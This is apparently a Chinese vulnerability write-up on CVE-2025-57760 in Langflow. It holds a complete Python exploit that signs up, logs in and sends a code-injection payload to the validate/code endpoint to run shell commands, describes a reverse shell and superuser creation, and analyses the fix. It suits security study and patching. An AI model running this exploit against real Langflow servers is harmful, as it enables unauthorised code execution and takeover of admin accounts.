<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250828112434076.png" alt="image-20250828112434076" loading="lazy"></p>
<p>然后看登录的请求包</p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250828112438925.png" alt="image-20250828112438925" loading="lazy"></p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250828112444235.png" alt="image-20250828112444235" loading="lazy"></p>
<p>可以看到该用户并没有<code>superuser</code>的权限。</p>
<p>然后通过<code>/api/v1/validate/code</code>接口执行命令，这个接口是langflow的一个历史RCE漏洞，在langflow &lt;1.3.0版本可以传入任意python代码，让其非授权执行并且没有沙箱限制，在1.3.0版本之后修复了未授权，但还是可以授权RCE。</p>
<pre class="language-none"><code class="language-none">### Code Execution Vulnerability (Fixed in 1.3.0)

Langflow allows users to define and run **custom code components** through endpoints like &#96;&#x2F;api&#x2F;v1&#x2F;validate&#x2F;code&#96;. In versions &lt; 1.3.0, this endpoint did not enforce authentication or proper sandboxing, allowing **unauthenticated arbitrary code execution**.

This means an attacker could send malicious code to the endpoint and have it executed on the server—leading to full system compromise, including data theft, remote shell access, or lateral movement within the network.

To address, upgrade to &gt;&#x3D; 1.3.0.</code></pre>

<p>所以在<code>CVE-2025-57760</code>中需要经过认证用户才能利用该接口实现RCE，进而利用CLI 命令进行权限提升。</p>
<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"code"</span><span class="token operator">:</span> "
def run(cd=exec('raise Exception(__import__(<span class="token string">"subprocess"</span>).check_output(<span class="token string">"&#123;command&#125;"</span><span class="token punctuation">,</span> shell=True))'))<span class="token operator">:</span> pass"<span class="token punctuation">&#125;</span></code></pre>

<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>写个exp,集成注册，登录和使用rce接口</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> random
<span class="token keyword">import</span> string

<span class="token keyword">def</span> <span class="token function">random_username</span><span class="token punctuation">(</span>length<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> k<span class="token operator">=</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">signup</span><span class="token punctuation">(</span>base_url<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base_url<span class="token punctuation">&#125;</span></span><span class="token string">/api/v1/users/"</span></span>
    payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> password<span class="token punctuation">&#125;</span>
    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> json<span class="token operator">=</span>payload<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Signup:"</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>status_code<span class="token punctuation">,</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    <span class="token keyword">return</span> r

<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span>base_url<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base_url<span class="token punctuation">&#125;</span></span><span class="token string">/api/v1/login"</span></span>
    payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> password<span class="token punctuation">&#125;</span>
    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Login:"</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>status_code<span class="token punctuation">,</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    data <span class="token operator">=</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
    access_token <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"access_token"</span><span class="token punctuation">)</span>
    cookies <span class="token operator">=</span> r<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get_dict<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> access_token<span class="token punctuation">,</span> cookies

<span class="token keyword">def</span> <span class="token function">run_code</span><span class="token punctuation">(</span>base_url<span class="token punctuation">,</span> access_token<span class="token punctuation">,</span> cookies<span class="token punctuation">,</span> command<span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base_url<span class="token punctuation">&#125;</span></span><span class="token string">/api/v1/validate/code"</span></span>
    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string">"Authorization"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"Bearer </span><span class="token interpolation"><span class="token punctuation">&#123;</span>access_token<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span>
        <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/json"</span>
    <span class="token punctuation">&#125;</span>
    code_payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""
def run(cd=exec('raise Exception(__import__("subprocess").check_output("</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">", shell=True))')): pass
"""</span></span>
    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span> json<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"code"</span><span class="token punctuation">:</span> code_payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Validate:"</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Response:"</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Usage: python </span><span class="token interpolation"><span class="token punctuation">&#123;</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string"> &lt;command>"</span></span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    command <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    base_url <span class="token operator">=</span> <span class="token string">"http://10.0.2.7:7860"</span>
    username <span class="token operator">=</span> random_username<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
    password <span class="token operator">=</span> <span class="token string">"123456"</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] Using random username: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    signup<span class="token punctuation">(</span>base_url<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span>
    token<span class="token punctuation">,</span> cookies <span class="token operator">=</span> login<span class="token punctuation">(</span>base_url<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span>
    run_code<span class="token punctuation">(</span>base_url<span class="token punctuation">,</span> token<span class="token punctuation">,</span> cookies<span class="token punctuation">,</span> command<span class="token punctuation">)</span>
</code></pre>

<p>然后反弹shell</p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250828112453887.png" alt="image-20250828112453887" loading="lazy"></p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250828112457639.png" alt="image-20250828112457639" loading="lazy"></p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>接下来就是CVE-2025-57760最重要的一环，也就是<code>/app/.venv/bin/langflow superuser</code>可以创建任意superuser用户，尽管的通过低权限用户拿到的shell。</p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250828112501805.png" alt="image-20250828112501805" loading="lazy"></p>
<p>然后尝试使用新创建的用户<code>zhangsan/zhangsan</code>登录Web</p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250828112505951.png" alt="image-20250828112505951" loading="lazy">拿下高权限用户。</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>定位到<code>superuser</code>命令</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>command</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">superuser</span><span class="token punctuation">(</span>
    username<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> typer<span class="token punctuation">.</span>Option<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span> prompt<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"Username for the superuser."</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    password<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> typer<span class="token punctuation">.</span>Option<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span> prompt<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> hide_input<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"Password for the superuser."</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    log_level<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> typer<span class="token punctuation">.</span>Option<span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"Logging level."</span><span class="token punctuation">,</span> envvar<span class="token operator">=</span><span class="token string">"LANGFLOW_LOG_LEVEL"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Create a superuser."""</span>
    configure<span class="token punctuation">(</span>log_level<span class="token operator">=</span>log_level<span class="token punctuation">)</span>
    db_service <span class="token operator">=</span> get_db_service<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">_create_superuser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">await</span> initialize_services<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">async</span> <span class="token keyword">with</span> session_getter<span class="token punctuation">(</span>db_service<span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>
            <span class="token keyword">from</span> langflow<span class="token punctuation">.</span>services<span class="token punctuation">.</span>auth<span class="token punctuation">.</span>utils <span class="token keyword">import</span> create_super_user

            <span class="token keyword">if</span> <span class="token keyword">await</span> create_super_user<span class="token punctuation">(</span>db<span class="token operator">=</span>session<span class="token punctuation">,</span> username<span class="token operator">=</span>username<span class="token punctuation">,</span> password<span class="token operator">=</span>password<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token comment"># Verify that the superuser was created</span>
                <span class="token keyword">from</span> langflow<span class="token punctuation">.</span>services<span class="token punctuation">.</span>database<span class="token punctuation">.</span>models<span class="token punctuation">.</span>user<span class="token punctuation">.</span>model <span class="token keyword">import</span> User

                stmt <span class="token operator">=</span> select<span class="token punctuation">(</span>User<span class="token punctuation">)</span><span class="token punctuation">.</span>where<span class="token punctuation">(</span>User<span class="token punctuation">.</span>username <span class="token operator">==</span> username<span class="token punctuation">)</span>
                user<span class="token punctuation">:</span> User <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">await</span> session<span class="token punctuation">.</span><span class="token keyword">exec</span><span class="token punctuation">(</span>stmt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> user <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> <span class="token keyword">not</span> user<span class="token punctuation">.</span>is_superuser<span class="token punctuation">:</span>
                    typer<span class="token punctuation">.</span>echo<span class="token punctuation">(</span><span class="token string">"Superuser creation failed."</span><span class="token punctuation">)</span>
                    <span class="token keyword">return</span>
                <span class="token comment"># Now create the first folder for the user</span>
                result <span class="token operator">=</span> <span class="token keyword">await</span> get_or_create_default_folder<span class="token punctuation">(</span>session<span class="token punctuation">,</span> user<span class="token punctuation">.</span><span class="token builtin">id</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> result<span class="token punctuation">:</span>
                    typer<span class="token punctuation">.</span>echo<span class="token punctuation">(</span><span class="token string">"Default folder created successfully."</span><span class="token punctuation">)</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    msg <span class="token operator">=</span> <span class="token string">"Could not create default folder."</span>
                    <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>
                typer<span class="token punctuation">.</span>echo<span class="token punctuation">(</span><span class="token string">"Superuser created successfully."</span><span class="token punctuation">)</span>

            <span class="token keyword">else</span><span class="token punctuation">:</span>
                typer<span class="token punctuation">.</span>echo<span class="token punctuation">(</span><span class="token string">"Superuser creation failed."</span><span class="token punctuation">)</span>

    asyncio<span class="token punctuation">.</span>run<span class="token punctuation">(</span>_create_superuser<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<p>首先会调用<code>create_super_user</code></p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">create_super_user</span><span class="token punctuation">(</span>
    username<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span>
    password<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span>
    db<span class="token punctuation">:</span> AsyncSession<span class="token punctuation">,</span>
<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> User<span class="token punctuation">:</span>
    super_user <span class="token operator">=</span> <span class="token keyword">await</span> get_user_by_username<span class="token punctuation">(</span>db<span class="token punctuation">,</span> username<span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token keyword">not</span> super_user<span class="token punctuation">:</span>
        super_user <span class="token operator">=</span> User<span class="token punctuation">(</span>
            username<span class="token operator">=</span>username<span class="token punctuation">,</span>
            password<span class="token operator">=</span>get_password_hash<span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">,</span>
            is_superuser<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
            is_active<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
            last_login_at<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>
        <span class="token punctuation">)</span>

        db<span class="token punctuation">.</span>add<span class="token punctuation">(</span>super_user<span class="token punctuation">)</span>
        <span class="token keyword">await</span> db<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">await</span> db<span class="token punctuation">.</span>refresh<span class="token punctuation">(</span>super_user<span class="token punctuation">)</span>

    <span class="token keyword">return</span> super_user</code></pre>

<p>可以看到从数据库获取user信息后，如果该用户不存在，则会创建一个该用户名的超级用户，然后调用<code> SQLAlchemy ORM</code>的add进行添加，它的add实现是增添或者更新</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">_save_or_update_impl</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> state<span class="token punctuation">:</span> InstanceState<span class="token punctuation">[</span>Any<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> state<span class="token punctuation">.</span>key <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>_save_impl<span class="token punctuation">(</span>state<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>_update_impl<span class="token punctuation">(</span>state<span class="token punctuation">)</span></code></pre>

<p>而这整个过程并没有进行权限校验，所以普通用户可以直接创建一个<code>superuser</code>甚至覆盖掉强制更新覆盖掉原来存在的用户</p>
<h2 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>command</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">superuser</span><span class="token punctuation">(</span>
    username<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> typer<span class="token punctuation">.</span>Option<span class="token punctuation">(</span>
        <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"Username for the superuser. Defaults to 'langflow' when AUTO_LOGIN is enabled."</span>
    <span class="token punctuation">)</span><span class="token punctuation">,</span>
    password<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> typer<span class="token punctuation">.</span>Option<span class="token punctuation">(</span>
        <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"Password for the superuser. Defaults to 'langflow' when AUTO_LOGIN is enabled."</span>
    <span class="token punctuation">)</span><span class="token punctuation">,</span>
    log_level<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> typer<span class="token punctuation">.</span>Option<span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"Logging level."</span><span class="token punctuation">,</span> envvar<span class="token operator">=</span><span class="token string">"LANGFLOW_LOG_LEVEL"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    auth_token<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> typer<span class="token punctuation">.</span>Option<span class="token punctuation">(</span>
        <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"Authentication token of existing superuser."</span><span class="token punctuation">,</span> envvar<span class="token operator">=</span><span class="token string">"LANGFLOW_SUPERUSER_TOKEN"</span>
    <span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Create a superuser.

    When AUTO_LOGIN is enabled, uses default credentials.
    In production mode, requires authentication.
    """</span>
    configure<span class="token punctuation">(</span>log_level<span class="token operator">=</span>log_level<span class="token punctuation">)</span>

    asyncio<span class="token punctuation">.</span>run<span class="token punctuation">(</span>_create_superuser<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> auth_token<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<p>新版本之后创建superuser命令加了一个参数<code>auth_token</code>，这个参数默认为NULL并且可以从环境变量读取，然后调用<code>_create_superuser</code></p>
<pre class="language-python" data-language="python"><code class="language-python">settings_service <span class="token operator">=</span> get_settings_service<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># Check if superuser creation via CLI is enabled</span>
<span class="token keyword">if</span> <span class="token keyword">not</span> settings_service<span class="token punctuation">.</span>auth_settings<span class="token punctuation">.</span>ENABLE_SUPERUSER_CLI<span class="token punctuation">:</span>
    typer<span class="token punctuation">.</span>echo<span class="token punctuation">(</span><span class="token string">"Error: Superuser creation via CLI is disabled."</span><span class="token punctuation">)</span>
    typer<span class="token punctuation">.</span>echo<span class="token punctuation">(</span><span class="token string">"Set LANGFLOW_ENABLE_SUPERUSER_CLI=true to enable this feature."</span><span class="token punctuation">)</span>
    <span class="token keyword">raise</span> typer<span class="token punctuation">.</span>Exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre>

<p>如果环境变量没有配置<code>LANGFLOW_ENABLE_SUPERUSER_CLI=true</code>则直接退出，不准创建超级用户</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> settings_service<span class="token punctuation">.</span>auth_settings<span class="token punctuation">.</span>AUTO_LOGIN<span class="token punctuation">:</span>
    <span class="token comment"># Force default credentials for AUTO_LOGIN mode</span>
    username <span class="token operator">=</span> DEFAULT_SUPERUSER
    password <span class="token operator">=</span> DEFAULT_SUPERUSER_PASSWORD
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token comment"># Production mode - prompt for credentials if not provided</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> username<span class="token punctuation">:</span>
        username <span class="token operator">=</span> typer<span class="token punctuation">.</span>prompt<span class="token punctuation">(</span><span class="token string">"Username"</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> password<span class="token punctuation">:</span>
        password <span class="token operator">=</span> typer<span class="token punctuation">.</span>prompt<span class="token punctuation">(</span><span class="token string">"Password"</span><span class="token punctuation">,</span> hide_input<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre>

<p>如果环境变量设置<code>LANGFLOW_AUTO_LOGIN</code>，则用户名和密码就是docker开启时候配置的<code>SUPERUSER</code>的用户名密码，因为如果开启了<code>LANGFLOW_AUTO_LOGIN</code>，用户没法登录，打开环境超级用户自动登录，所以默认拿到shell的用户是超级用户</p>
<p>如果没开启自动登录，用户名和密码由用户输入</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> langflow<span class="token punctuation">.</span>services<span class="token punctuation">.</span>database<span class="token punctuation">.</span>models<span class="token punctuation">.</span>user<span class="token punctuation">.</span>crud <span class="token keyword">import</span> get_all_superusers

existing_superusers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">async</span> <span class="token keyword">with</span> session_scope<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>
    <span class="token comment"># Note that the default superuser is created by the initialize_services() function,</span>
    <span class="token comment"># but leaving this check here in case we change that behavior</span>
    existing_superusers <span class="token operator">=</span> <span class="token keyword">await</span> get_all_superusers<span class="token punctuation">(</span>session<span class="token punctuation">)</span>
is_first_setup <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>existing_superusers<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span></code></pre>

<p>然后从数据库获取所有超级用户的列表</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> settings_service<span class="token punctuation">.</span>auth_settings<span class="token punctuation">.</span>AUTO_LOGIN<span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> is_first_setup<span class="token punctuation">:</span>
        typer<span class="token punctuation">.</span>echo<span class="token punctuation">(</span><span class="token string">"Error: Cannot create additional superusers when AUTO_LOGIN is enabled."</span><span class="token punctuation">)</span>
        typer<span class="token punctuation">.</span>echo<span class="token punctuation">(</span><span class="token string">"AUTO_LOGIN mode is for development with only the default superuser."</span><span class="token punctuation">)</span>
        typer<span class="token punctuation">.</span>echo<span class="token punctuation">(</span><span class="token string">"To create additional superusers:"</span><span class="token punctuation">)</span>
        typer<span class="token punctuation">.</span>echo<span class="token punctuation">(</span><span class="token string">"1. Set LANGFLOW_AUTO_LOGIN=false"</span><span class="token punctuation">)</span>
        typer<span class="token punctuation">.</span>echo<span class="token punctuation">(</span><span class="token string">"2. Run this command again with --auth-token"</span><span class="token punctuation">)</span>
        <span class="token keyword">raise</span> typer<span class="token punctuation">.</span>Exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    typer<span class="token punctuation">.</span>echo<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"AUTO_LOGIN enabled. Creating default superuser '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">'..."</span></span><span class="token punctuation">)</span>
    typer<span class="token punctuation">.</span>echo<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Note: Default credentials are </span><span class="token interpolation"><span class="token punctuation">&#123;</span>DEFAULT_SUPERUSER<span class="token punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>DEFAULT_SUPERUSER_PASSWORD<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token comment"># AUTO_LOGIN is false - production mode</span>
<span class="token keyword">elif</span> is_first_setup<span class="token punctuation">:</span>
        typer<span class="token punctuation">.</span>echo<span class="token punctuation">(</span><span class="token string">"No superusers found. Creating first superuser..."</span><span class="token punctuation">)</span></code></pre>

<p>如果当前超级用户数量为0，用环境变量里面的用户名和密码创建一个超级用户</p>
<p>如果已经是创建过超级用户之后并且开启了自动登录，则不准创建超级用户</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token comment"># Authentication is required in production mode</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> auth_token<span class="token punctuation">:</span>
            typer<span class="token punctuation">.</span>echo<span class="token punctuation">(</span><span class="token string">"Error: Creating a superuser requires authentication."</span><span class="token punctuation">)</span>
            typer<span class="token punctuation">.</span>echo<span class="token punctuation">(</span><span class="token string">"Please provide --auth-token with a valid superuser API key or JWT token."</span><span class="token punctuation">)</span>
            typer<span class="token punctuation">.</span>echo<span class="token punctuation">(</span><span class="token string">"To get a token, use: `uv run langflow api_key`"</span><span class="token punctuation">)</span>
            <span class="token keyword">raise</span> typer<span class="token punctuation">.</span>Exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

        <span class="token comment"># Validate the auth token</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            auth_user <span class="token operator">=</span> <span class="token boolean">None</span>
            <span class="token keyword">async</span> <span class="token keyword">with</span> session_scope<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>
                <span class="token comment"># Try JWT first</span>
                user <span class="token operator">=</span> <span class="token boolean">None</span>
                <span class="token keyword">try</span><span class="token punctuation">:</span>
                    user <span class="token operator">=</span> <span class="token keyword">await</span> get_current_user_by_jwt<span class="token punctuation">(</span>auth_token<span class="token punctuation">,</span> session<span class="token punctuation">)</span>
                <span class="token keyword">except</span> <span class="token punctuation">(</span>JWTError<span class="token punctuation">,</span> HTTPException<span class="token punctuation">)</span><span class="token punctuation">:</span>
                    <span class="token comment"># Try API key</span>
                    api_key_result <span class="token operator">=</span> <span class="token keyword">await</span> check_key<span class="token punctuation">(</span>session<span class="token punctuation">,</span> auth_token<span class="token punctuation">)</span>
                    <span class="token keyword">if</span> api_key_result <span class="token keyword">and</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>api_key_result<span class="token punctuation">,</span> <span class="token string">"is_superuser"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                        user <span class="token operator">=</span> api_key_result
                auth_user <span class="token operator">=</span> user

            <span class="token keyword">if</span> <span class="token keyword">not</span> auth_user <span class="token keyword">or</span> <span class="token keyword">not</span> auth_user<span class="token punctuation">.</span>is_superuser<span class="token punctuation">:</span>
                typer<span class="token punctuation">.</span>echo<span class="token punctuation">(</span>
                    <span class="token string">"Error: Invalid token or insufficient privileges. Only superusers can create other superusers."</span>
                <span class="token punctuation">)</span>
